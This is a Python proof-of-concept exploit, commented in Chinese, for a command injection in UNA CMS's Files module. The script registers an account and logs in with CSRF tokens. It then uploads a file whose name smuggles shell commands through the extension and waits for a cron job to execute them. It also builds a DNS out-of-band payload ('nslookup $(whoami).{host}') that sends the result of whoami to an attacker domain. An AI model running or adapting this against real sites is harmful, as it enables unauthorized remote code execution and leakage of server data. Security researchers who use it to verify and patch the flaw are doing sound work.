#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UNA CMS — BxFilesModule 扩展名命令注入 (CWE-78) 全链路 PoC
================================================================================
漏洞类型 : OS Command Injection (shell_exec 拼接未转义的文件扩展名)
权限要求 : post-auth —— 普通用户即可，UNA 默认开放注册 (sys_account_autoapproval=on)
受影响   : modules/boonex/files/classes/BxFilesModule.php  serviceProcessFilesData()
           inc/classes/BxDolStorage.php  getFileExt()/isValidExt()
触发方式 : Files 模块 cron 任务 bx_files_process_data (* * * * *)

完整利用链（全部走真实 HTTP 表单，含 CSRF）：
  1) POST /create-account                注册一个普通用户
  2) POST /member.php                    登录，拿到 memberSession
  3) POST /storage_uploader.php          以恶意文件名上传文件
                                         文件名 ext = 'pdf";<CMD>;#' 绕过 pathinfo()+in_array 黑名单
  4) POST /create-file (attachments[])   提交 Files 条目 (data_processed=0)
  5) 等待 cron 每分钟执行 BxFilesCronProcessData -> serviceProcessFilesData()
     -> shell_exec('"/usr/bin/java" ... --text "/tmp/<id>.pdf";<CMD>;#"')  => <CMD> 执行

两种验证模式：
  A. 内联（本机/实验环境） : --payload 'id'  , 结果写入 bx_files_main.`data`，用 --verify-db 读回
  B. OOB（真实目标）        : --oob-host 你的dns域 , 构造 nslookup 外带 payload

关键约束（实测）：
  * payload 不能包含 '/' —— $sFilePath 会被 @file_put_contents() 当多级路径，创建失败即 continue，
    shell_exec 根本不会到达。故报告中 curl/wget URL 形式不可达，需用无 '/' 的内联或 DNS 外带形式。
  * CSRF token 单次有效，每个表单都要重新 GET 页面取新 token。

用法示例：
  # 实验环境：注册+登录+上传+建条目+读回 id 输出（自动用 docker 读 DB）
  python3 poc_una_rce_fullchain.py --base-url http://localhost --payload 'id' --verify-db

  # 真实目标：DNS 外带
  python3 poc_una_rce_fullchain.py --base-url https://target.example --oob-host abc.oast.fun

仅限授权测试。
"""
import argparse
import json
import re
import shlex
import subprocess
import sys
import time
import urllib.parse

try:
    import requests
except ImportError:
    sys.stderr.write("需要 requests：pip install requests\n")
    sys.exit(2)

# --- CSRF token 提取（兼容 name/value 两种属性顺序） ---
_CSRF_PATTERNS = [
    re.compile(r'name=["\']csrf_token["\'][^>]*?value=["\']([^"\']+)["\']', re.I),
    re.compile(r'value=["\']([^"\']+)["\'][^>]*?name=["\']csrf_token["\']', re.I),
]


def get_csrf(html):
    for p in _CSRF_PATTERNS:
        m = p.search(html or '')
        if m:
            return m.group(1)
    return None


class Log:
    @staticmethod
    def info(m):  print(f"[*] {m}")
    @staticmethod
    def ok(m):    print(f"[+] {m}")
    @staticmethod
    def warn(m):  print(f"[!] {m}")
    @staticmethod
    def fail(m):  print(f"[-] {m}")


class UnaRcePoC:
    def __init__(self, base_url, timeout=30, proxy=None, insecure=False):
        self.base = base_url.rstrip('/')
        self.timeout = timeout
        self.s = requests.Session()
        self.s.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 UNA-PoC',
            'Accept': '*/*',
        })
        if proxy:
            self.s.proxies = {'http': proxy, 'https': proxy}
        if insecure:
            self.s.verify = False
            try:
                import urllib3
                urllib3.disable_warnings()
            except Exception:
                pass

    # ---------- 基础请求 ----------
    def _get(self, path):
        return self.s.get(self.base + path, timeout=self.timeout, allow_redirects=True)

    def _post(self, path, data):
        return self.s.post(self.base + path, data=data, timeout=self.timeout, allow_redirects=True)

    # ---------- 1) 注册 ----------
    def register(self, email, name, password):
        r = self._get('/create-account')
        tok = get_csrf(r.text)
        if not tok:
            Log.fail(f"注册页未取到 csrf_token (HTTP {r.status_code}, {len(r.text)} bytes) — 目标可能关闭注册或启用了验证码")
            return False
        data = {
            'csrf_token': tok,
            'name': name,
            'email': email,
            'password': password,
            'receive_news': '1',
            'do_publish': 'Create new account',
        }
        r = self._post('/create-account', data)
        # 成功判据：页面不再出现同样的表单错误；进一步由登录环节确认
        if re.search(r'(already|already exists|incorrect|invalid)\b', r.text, re.I):
            Log.warn("注册响应含可疑错误关键字，仍继续尝试登录")
        Log.ok(f"注册请求已提交: {email}")
        return True

    # ---------- 2) 登录 ----------
    def is_authenticated(self):
        """可靠判据：登录后首页含 account-settings / bx-menu-account，未登录含 create-account"""
        try:
            t = self._get('/').text or ''
        except Exception:
            return False
        return ('account-settings' in t) or ('bx-menu-account' in t)

    def login(self, email, password):
        # UNA 默认在注册成功后自动建立已认证会话，此时直接复用
        if self.is_authenticated():
            Log.ok("会话已认证（注册后自动登录），跳过登录表单")
            return True
        r = self._get('/login')
        tok = get_csrf(r.text)
        if not tok:
            Log.fail(f"登录页未取到 csrf_token (HTTP {r.status_code}, {len(r.text)} bytes)")
            return False
        data = {
            'csrf_token': tok,
            'ID': email,          # 注意：登录表单字段名是大写 ID
            'Password': password,  # 字段名是大写 Password
            'rememberMe': '1',
            'role': '1',
            'relocate': self.base + '/member.php',
            'login': 'Log in',
        }
        self._post('/member.php', data)
        if self.is_authenticated():
            Log.ok("登录成功，已获得有效会话")
            return True
        Log.fail("登录失败（可能被验证码/二次验证拦截）")
        return False

    # ---------- 3) 上传（恶意文件名） ----------
    def upload(self, filename, content=b'UNA RCE PoC payload'):
        uid = 'poc' + str(int(time.time()))
        q = urllib.parse.urlencode({
            'uo': 'sys_html5',
            'so': 'bx_files_files',
            'uid': uid,
            'a': 'upload',
            'p': '0',
            'file': filename,
        })
        url = f"{self.base}/storage_uploader.php?{q}"
        r = self.s.post(url, data=content,
                        headers={'Content-Type': 'application/octet-stream'},
                        timeout=self.timeout, allow_redirects=True)
        try:
            j = json.loads(r.text)
        except Exception:
            Log.fail(f"上传未返回 JSON (HTTP {r.status_code}): {r.text[:200]}")
            return None, r
        if j.get('success') == 1:
            Log.ok(f"上传成功 file_id={j.get('id')}  (filename={filename!r})")
            return j.get('id'), r
        Log.fail(f"上传被拒绝: {j}")
        return None, r

    # ---------- 4) 创建 Files 条目（真实表单） ----------
    def create_entry(self, file_id, cat=1, allow_view_to=3, title=None):
        r = self._get('/create-file')
        tok = get_csrf(r.text)
        if not tok:
            Log.fail(f"/create-file 未取到 csrf_token (HTTP {r.status_code})")
            return False
        data = {
            'csrf_token': tok,
            'cf': '1',
            'cat': str(cat),
            'allow_view_to': str(allow_view_to),
            'attachments[]': str(file_id),
            'do_submit': 'Submit',
        }
        if title:
            data['title'] = title
        r = self._post('/create-file', data)
        Log.ok(f"已提交 Files 条目 (attachments[]={file_id})")
        return True


def build_payload(args):
    if args.oob_host:
        # 不含 '/' 的 DNS 外带；whoami/id 输出作为子域
        cmd = args.oob_cmd.replace('{host}', args.oob_host)
        payload = cmd
        Log.info(f"使用 OOB(DNS) payload: {cmd}")
    else:
        payload = args.payload
        Log.info(f"使用内联 payload: {payload}")
    if '/' in payload:
        Log.fail("payload 含 '/' — 会导致 file_put_contents 路径创建失败，shell_exec 不可达。请改用无 '/' 的 payload。")
        sys.exit(3)
    if args.raw_filename:
        filename = args.raw_filename
    else:
        # 形如: evil.pdf";<payload>;#
        # pathinfo() 取最后一个 '.' 之后的全部内容 => ext = 'pdf";<payload>;#'
        # in_array() 精确匹配黑名单，该 ext 不命中 => 绕过
        filename = 'evil.' + args.fake_ext + '";' + payload + ';#'
    return filename


def db_read(container, file_id, db_user, db_pass, db_name):
    q = (f"SELECT id,author,file_id,data_processed,`data` FROM bx_files_main "
         f"WHERE file_id={int(file_id)} ORDER BY id DESC LIMIT 1\\G")
    cmd = ["docker", "exec", container, "mysql", f"-u{db_user}", f"-p{db_pass}", db_name, "-e", q]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return (r.stdout or '') + (r.stderr or '')
    except Exception as e:
        return f"(db read failed: {e})"


def main():
    ap = argparse.ArgumentParser(description="UNA BxFilesModule CWE-78 full-chain PoC")
    ap.add_argument('--base-url', required=True, help="站点根 URL, 例如 http://localhost")
    ap.add_argument('--username', default=None, help="注册用户名(默认随机)")
    ap.add_argument('--email', default=None, help="注册邮箱(默认随机)")
    ap.add_argument('--password', default='Passw0rd!123', help="注册/登录密码")
    ap.add_argument('--payload', default='id', help="内联 shell payload(不含 '/')，默认 id")
    ap.add_argument('--fake-ext', default='pdf', help="伪造扩展名(需不在黑名单), 默认 pdf")
    ap.add_argument('--raw-filename', default=None, help="直接指定恶意文件名(覆盖 --fake-ext/--payload)")
    ap.add_argument('--oob-host', default=None, help="启用 DNS 外带：指定攻击者域名")
    ap.add_argument('--oob-cmd', default='nslookup $(whoami).{host}', help="OOB 命令模板")
    ap.add_argument('--cat', type=int, default=1, help="条目分类 id(不同站点取值不同), 默认 1")
    ap.add_argument('--timeout', type=int, default=30, help="HTTP 超时秒")
    ap.add_argument('--wait', type=int, default=90, help="等待 cron 处理的秒数(0=不等)")
    # 实验环境读回
    ap.add_argument('--verify-db', action='store_true', help="(实验环境) 用 docker exec 读回 bx_files_main.data")
    ap.add_argument('--db-container', default='una-db-1')
    ap.add_argument('--db-user', default='una')
    ap.add_argument('--db-pass', default='una123')
    ap.add_argument('--db-name', default='una')
    ap.add_argument('--proxy', default=None, help="HTTP 代理, 例如 http://127.0.0.1:8080")
    ap.add_argument('--insecure', action='store_true', help="忽略 TLS 校验")
    args = ap.parse_args()

    ts = int(time.time())
    email = args.email or f"poc_{ts}@example.com"
    username = args.username or f"poc{ts}"

    filename = build_payload(args)
    Log.info(f"恶意文件名: {filename!r}")
    Log.info(f"目标: {args.base_url}")

    poc = UnaRcePoC(args.base_url, timeout=args.timeout, proxy=args.proxy, insecure=args.insecure)

    print("\n=== [1/4] 注册普通用户 ===")
    if not poc.register(email, username, args.password):
        sys.exit(1)

    print("\n=== [2/4] 登录取会话 ===")
    if not poc.login(email, args.password):
        sys.exit(1)

    print("\n=== [3/4] 上传恶意文件名 (扩展名绕过) ===")
    file_id, _ = poc.upload(filename)
    if not file_id:
        sys.exit(1)

    print("\n=== [4/4] 提交 Files 条目 (data_processed=0) ===")
    if not poc.create_entry(file_id, cat=args.cat):
        sys.exit(1)

    Log.ok(f"利用链已投放完成：file_id={file_id}，等待 cron 任务 bx_files_process_data (* * * * *) 触发")
    Log.info("命令执行位置：cron 中的 shell_exec(\"... --text \\\"/tmp/<id>.<ext>\\\"\")")

    if args.wait <= 0:
        print("\n(DNS 外带模式下请观察你的 DNS/OAST 回连)")
        return

    if not args.verify_db:
        print("\n[*] 未启用 --verify-db。真实目标请观察 OOB 回连；实验环境可加 --verify-db 读回命令输出。")
        return

    print(f"\n=== 轮询等待 cron (最多 {args.wait}s) 并读回命令输出 ===")
    deadline = time.time() + args.wait
    while time.time() < deadline:
        out = db_read(args.db_container, file_id, args.db_user, args.db_pass, args.db_name)
        if 'data_processed' in out and 'data:' in out:
            m = re.search(r'data_processed:\s*(\d+)', out)
            dp = m.group(1) if m else '?'
            if dp == '1':
                print(out)
                if re.search(r'uid=\d+\(', out):
                    print("\n>>> 命令注入 -> RCE 确认：shell_exec 捕获的注入命令输出已回写 bx_files_main.data <<<")
                return
        time.sleep(5)
    print(db_read(args.db_container, file_id, args.db_user, args.db_pass, args.db_name))
    Log.warn("等待超时，请检查 cron 是否运行 / 分类 id / 扩展名黑名单")


if __name__ == '__main__':
    main()
